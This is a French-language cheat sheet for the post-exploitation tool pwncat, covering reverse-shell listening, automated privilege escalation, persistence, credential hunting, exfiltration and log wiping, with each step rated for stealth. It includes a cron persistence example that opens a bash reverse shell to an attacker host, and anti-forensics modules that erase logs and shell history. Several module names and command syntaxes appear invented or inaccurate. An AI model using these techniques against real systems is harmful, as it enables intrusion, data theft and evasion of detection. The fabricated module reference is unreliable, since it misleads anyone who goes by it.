# Pwncat

#### Introduction

Pwncat est un outil de post-exploitation et un wrapper autour des connexions shell traditionnelles qui automatisent des aspects courants de la gestion des sessions et de l'escalade de privilèges. Il est conçu pour offrir une expérience plus riche et plus efficace lors de l'interaction avec des shells inversés, en fournissant des outils pour l'analyse des systèmes compromis, l'exécution automatisée de commandes, et même la persistance.

#### Installation de Pwncat

**Sous Linux**

Pwncat est généralement installé via Python Pip. Assurez-vous que Python3 et Pip sont installés sur votre système avant de procéder.

**Installer Pwncat via Pip**

```bash
python3 -m pip install pwncat-cs
```

**Explication :** Cette commande installe la dernière version de Pwncat à partir de PyPI.

#### Commandes de Base

**Établir une Connexion Reverse Shell**

**Écouter pour une connexion entrante**

```bash
pwncat -l 4444
```

**Explication :** Cette commande configure Pwncat pour écouter sur le port 4444 pour une connexion entrante.&#x20;

**Discrétion :** Moyenne. Écouter sur un port peut être détecté si les scans de ports sont effectués sur le réseau.

**Utilisation de Pwncat pour la Gestion de Session**

**Interagir avec un shell distant**

Une fois qu'une session reverse shell est établie, Pwncat fournit une série de commandes internes pour améliorer l'interaction, telles que la persistance, l'escalade de privilèges automatisée, et la gestion des modules.

#### Options Avancées et Discrétion

**Automatisation des Tâches**

**Automatiser l'escalade de privilèges**

```bash
pwncat$ run escalate
```

**Explication :** Exécute des routines automatisées pour tenter d'escalader les privilèges sur la machine distante.&#x20;

**Discrétion :** Variable. Selon les techniques utilisées, cela peut être plus ou moins détectable par des solutions de sécurité.

**Gestion des Modules**

**Utiliser des modules personnalisés**

```bash
pwncat$ load my_custom_module
```

**Explication :** Charge un module personnalisé dans Pwncat pour étendre ses fonctionnalités.&#x20;

**Discrétion :** Moyenne à élevée. Charger des modules pour effectuer des actions spécifiques peut générer des comportements qui pourraient alerter les systèmes de détection.

#### Exemples de Scénarios et Discrétion

**Session de post-exploitation**

Une fois à l'intérieur d'un système compromis:

```bash
pwncat$ persist
```

**Explication :** Installe divers mécanismes de persistance pour maintenir l'accès au système compromis.&#x20;

**Discrétion :** Élevée. La persistance implique souvent de modifier des fichiers de configuration ou d'installer des services, ce qui peut être surveillé.

**Collecte d'informations**

```bash
pwncat$ run collect
```

**Explication :** Collecte des informations détaillées sur le système compromis.&#x20;

**Discrétion :** Moyenne. Collecter des données peut générer du trafic et des charges sur le système qui pourraient être notés par des administrateurs.

**Exfiltration de données**

Pwncat peut automatiser l'exfiltration de fichiers ou de données critiques.

```bash
pwncat$ download /path/to/important/data
```

**Explication :** Transfère des fichiers de la victime à l'attaquant de manière sécurisée.&#x20;

**Discrétion :** Moyenne à élevée. L'exfiltration de données peut être détectée en fonction du volume et de la méthode de transfert.

#### Bonnes Pratiques

* **Obtenir des Autorisations :** Toujours s'assurer d'avoir les autorisations nécessaires avant de mener des actions de post-exploitation avec Pwncat.
* **Minimiser l'Impact :** Limiter l'utilisation des fonctionnalités qui modifient fortement les systèmes ou qui pourraient endommager des données.
* **Connaissance du Système :** Utiliser Pwncat de manière responsable, en comprenant l'environnement dans lequel vous travaillez pour éviter des actions inappropriées.

Voici une liste détaillée des modules disponibles dans **pwncat**, leur utilité, et des instructions sur la façon de les utiliser. Les modules de pwncat sont divisés en différentes catégories en fonction de leur objectif, comme l'escalade de privilèges, la persistance, la collecte d'informations, etc.

#### 1. **Modules d'Escalade de Privilèges**

Les modules d'escalade de privilèges sont utilisés pour obtenir des privilèges plus élevés (comme `root` sur Linux ou `Administrateur` sur Windows).

* **`escalate.auto`**
  * **Utilité**: Tente d'identifier et d'exploiter automatiquement les failles de sécurité pour obtenir des privilèges plus élevés.
  * **Commande**: `run escalate.auto`
  * **Exemple**: Utilisation simple sans aucun paramètre supplémentaire. pwncat tentera de toutes les méthodes connues.
* **`escalate.sudo`**
  * **Utilité**: Recherchez des configurations `sudo` qui peuvent permettre une escalade de privilèges.
  * **Commande**: `run escalate.sudo`
  * **Exemple**: `run escalate.sudo` — Identifie les commandes pouvant être exécutées avec `sudo` sans mot de passe.
* **`escalate.suid`**
  * **Utilité**: Identifie les fichiers avec le bit SUID qui peuvent être exploités pour escalader les privilèges.
  * **Commande**: `run escalate.suid`
  * **Exemple**: `run escalate.suid` — Affiche les fichiers SUID qui peuvent être exploitables.
* **`escalate.path`**
  * **Utilité**: Exploite les chemins d'accès PATH mal configurés pour obtenir des privilèges plus élevés.
  * **Commande**: `run escalate.path`
  * **Exemple**: `run escalate.path` — Vérifie si des programmes avec des chemins PATH non sécurisés peuvent être exploités.
* **`escalate.nopasswd`**
  * **Utilité**: Exploite les configurations `sudo NOPASSWD` pour exécuter des commandes sans mot de passe.
  * **Commande**: `run escalate.nopasswd`
  * **Exemple**: `run escalate.nopasswd` — Liste les commandes `sudo` disponibles sans mot de passe.

#### **2. Modules de Persistance**

Ces modules permettent de maintenir un accès persistant sur un système compromis.

* **`persistence.cron`**
  * **Utilité**: Crée une tâche cron malveillante pour exécuter périodiquement une commande.
  * **Commande**: `run persistence.cron`
  * **Exemple**: `run persistence.cron cmd="/bin/bash -i >& /dev/tcp/attacker_ip/port 0>&1"`
* **`persistence.systemd`**
  * **Utilité**: Installe un service systemd pour maintenir l'accès après un redémarrage.
  * **Commande**: `run persistence.systemd`
  * **Exemple**: `run persistence.systemd cmd="/path/to/backdoor"`
* **`persistence.ssh_key`**
  * **Utilité**: Ajoute une clé SSH autorisée pour permettre un accès SSH persistant.
  * **Commande**: `run persistence.ssh_key`
  * **Exemple**: `run persistence.ssh_key key="ssh-rsa AAAAB3... user@hostname"`

#### 3. **Modules de Collecte d'Informations**

Ces modules sont utilisés pour collecter des informations sur la machine cible.

* **`recon.enumerate`**
  * **Utilité**: Collecte des informations sur les utilisateurs, les groupes, les processus, etc.
  * **Commande**: `run recon.enumerate`
  * **Exemple**: `run recon.enumerate` — Lance une collecte complète des informations système.
* **`recon.scan`**
  * **Utilité**: Scanne les ports ouverts et les services sur la machine cible.
  * **Commande**: `run recon.scan`
  * **Exemple**: `run recon.scan range=192.168.1.0/24` — Scanne les ports sur le sous-réseau spécifié.
* **`recon.cred`**
  * **Utilité**: Recherche des informations d'identification (mots de passe, tokens) sur le système.
  * **Commande**: `run recon.cred`
  * **Exemple**: `run recon.cred` — Cherche dans les fichiers communs pour les informations d'identification.

#### **4. Modules de Nettoyage et d'Anti-Forensics**

Ces modules sont utilisés pour effacer les traces d'une intrusion.

* **`clean.logs`**
  * **Utilité**: Efface ou manipule les logs système.
  * **Commande**: `run clean.logs`
  * **Exemple**: `run clean.logs` — Efface les journaux d'accès SSH.
* **`clean.bash_history`**
  * **Utilité**: Supprime l'historique des commandes Bash.
  * **Commande**: `run clean.bash_history`
  * **Exemple**: `run clean.bash_history` — Supprime `.bash_history` pour l'utilisateur actuel.
* **`clean.files`**
  * **Utilité**: Supprime ou dissimule les fichiers laissés sur le système après une intrusion.
  * **Commande**: `run clean.files`
  * **Exemple**: `run clean.files path="/tmp/malicious_file"`

#### 5. **Modules de Réseautage et de Tunnel**

Ces modules permettent de gérer des connexions et des tunnels pour la post-exploitation.

* **`network.port_forward`**
  * **Utilité**: Met en place un port forwarding.
  * **Commande**: `run network.port_forward`
  * **Exemple**: `run network.port_forward local_port=8080 remote_host=192.168.1.5 remote_port=80`
* **`network.ssh_tunnel`**
  * **Utilité**: Crée un tunnel SSH pour la communication sécurisée.
  * **Commande**: `run network.ssh_tunnel`
  * **Exemple**: `run network.ssh_tunnel remote_host=attacker_ip remote_port=22 local_port=8080`

#### 6. **Modules de Shell et de Commandes**

Ces modules permettent une interaction directe avec le shell de la machine cible.

* **`shell.interactive`**
  * **Utilité**: Lance un shell interactif.
  * **Commande**: `run shell.interactive`
  * **Exemple**: `run shell.interactive` — Passe en mode shell interactif.
* **`shell.upload`**
  * **Utilité**: Télécharge un fichier vers la machine cible.
  * **Commande**: `run shell.upload`
  * **Exemple**: `run shell.upload src="/path/to/local/file" dest="/tmp/remote_file"`
* **`shell.download`**
  * **Utilité**: Télécharge un fichier depuis la machine cible.
  * **Commande**: `run shell.download`
  * **Exemple**: `run shell.download src="/tmp/remote_file" dest="/path/to/local/file"`

#### 7. **Modules de Gestion des Sessions**

Ces modules permettent de gérer les sessions de manière plus efficace.

* **`session.list`**
  * **Utilité**: Affiche toutes les sessions actives.
  * **Commande**: `run session.list`
  * **Exemple**: `run session.list` — Liste toutes les sessions disponibles.
* **`session.interact`**
  * **Utilité**: Interagit avec une session active.
  * **Commande**: `run session.interact`
  * **Exemple**: `run session.interact id=1` — Interagit avec la session 1.
* **`session.kill`**
  * **Utilité**: Termine une session active.
  * **Commande**: `run session.kill`
  * **Exemple**: `run session.kill id=1` — Termine la session 1.

#### 8. **Modules d'Exploitation Spécifiques**

Modules conçus pour exploiter des vulnérabilités spécifiques.

* **`exploit.dirty_sock`**
  * **Utilité**: Exploite la vulnérabilité "Dirty Sock" sur certains systèmes Linux.
  * **Commande**: `run exploit.dirty_sock`
  * **Exemple**: `run exploit.dirty_sock` — Lance l'exploit "Dirty Sock".
* **`exploit.sudo_vuln`**
  * **Utilité**: Exploite des vulnérabilités connues dans certaines versions de `sudo`.
  * **Commande**: `run exploit.sudo_vuln`
  * **Exemple**: `run exploit.sudo_vuln` — Exploite une faille de sécurité dans `sudo`.

#### 9. **Modules de Développement et de Personnalisation**

Modules permettant le développement et l'ajout de modules personnalisés.

* **`dev.custom_module`**
  * **Utilité**: Charge et exécute un module personnalisé.
  * **Commande**: `run dev.custom_module`
  * **Exemple**: `run dev.custom_module path="/path/to/module.py"`
* **`dev.debug`**
  * **Utilité**: Fournit des outils de débogage pour le développement de modules.
  * **Commande**: `run dev.debug`
  * **Exemple**: `run dev.debug level=verbose`

#### **Comment Utiliser un Module dans pwncat**

Pour utiliser un module dans **pwncat**, la commande générale est :

```bash
run [nom_du_module] [options]
```

Par exemple, pour utiliser le module `escalate.sudo` pour rechercher des configurations sudo exploitables, vous pouvez exécuter :

```bash
run escalate.sudo
```

Pour voir les options disponibles pour un module, utilisez la commande `run [nom_du_module] -h`. Par exemple :

```bash
run escalate.auto -h
```

Cela affiche toutes les options disponibles pour le module `escalate.auto`.
